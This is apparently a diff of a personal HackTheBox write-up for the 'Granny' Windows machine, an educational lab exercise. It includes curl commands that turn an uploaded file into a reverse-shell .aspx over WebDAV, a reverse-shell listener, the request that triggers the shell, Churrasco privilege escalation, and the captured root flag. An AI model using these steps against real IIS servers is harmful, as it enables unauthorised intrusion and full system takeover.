@@ -1,12 +1,24 @@
 ---
 title: "HTB: Granny [Easy]"
-date: 2025-10-06 00:00 +0800
+date: 2025-12-24 00:00 +0800
 categories: [HTB]
-tags: [HTB,Easy,Churrasco,SMB]
+tags: [HTB, Easy, Windows, IIS, WebDAV, File-Upload, SeImpersonatePrivilege, Churrasco, Token-Kidnapping]
 image: https://github.com/user-attachments/assets/7f4e4917-c848-4013-8641-ee9274a5bfe0
 ---
 
+This was my first Windows machine on HTB, building foundational knowledge of Windows exploitation. The key learning was bypassing WebDAV file upload restrictions using the PUT → MOVE technique to upload `.aspx` reverse shell, then exploiting `SeImpersonatePrivilege` with Churrasco for privilege escalation. Understanding token kidnapping (like stealing root's session credentials in Linux) was crucial for escalating from NETWORK SERVICE to SYSTEM.
+
 <img width="872" height="352" alt="image" src="https://github.com/user-attachments/assets/7f4e4917-c848-4013-8641-ee9274a5bfe0" />
+
+## Tools
+- nmap
+- davtest
+- cadavar
+- curl
+- penelope
+- impacket-smbserver
+- churrasco.exe
+- nc.exe
 
 ## Recon
 nmap scan result
@@ -164,7 +176,6 @@ Use **MOVE/COPY** as planned to change the file extension so we can properly exe
 ┌──(kali㉿kali)-[~/Desktop/HTB/Granny]
 └─$ curl -X MOVE -H 'Destination: http://granny.htb/revshell.aspx' http://granny.htb/revshell.txt
 ```
-
 Setup listener by using **penelope**.
 ```
 ┌──(kali㉿kali)-[~/Desktop/HTB/Granny]
@@ -172,7 +183,7 @@ Setup listener by using **penelope**.
 [+] Listening for reverse shells on 0.0.0.0:4455 →  127.0.0.1 • 192.168.134.128 • 172.18.0.1 • 172.17.0.1 • 10.10.16.2
 ➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 ```
-Interact with the payload
+Interact with the payload to trigger 
 ```
 ┌──(kali㉿kali)-[~/Desktop/HTB/Granny]
 └─$ curl http://granny.htb/revshell.aspx
@@ -195,10 +206,12 @@ nt authority\network service
 
 c:\windows\system32\inetsrv>
 ```
-## Discovery with network service
+### Discovery
 
-During discovery we were able to find multiple users but there's unique users such as Administrator and Lakis. Both are  
+During discovery we were able to find multiple users but there's unique users such as **Administrator** and **Lakis**. (out of topic, we can use `net user` and `whoami /priv` to get the information instead of how i did, which by bring **winPEAS**, Excuse my stupidity. 
 <img width="687" height="345" alt="image" src="https://github.com/user-attachments/assets/43515d7c-64e5-410e-9ee1-0e5a4628f06e" />
+
+However we cant access both users folders and files. 
 
 ## Shell as system
 
@@ -240,3 +253,5 @@ C:\DOCUME~1\Administrator\Desktop>type root.txt
 type root.txt
 aa4beed1c0584445ab463a6747bd06e9
 ```
+
+**[Badge](https://labs.hackthebox.com/achievement/machine/1737187/14)**
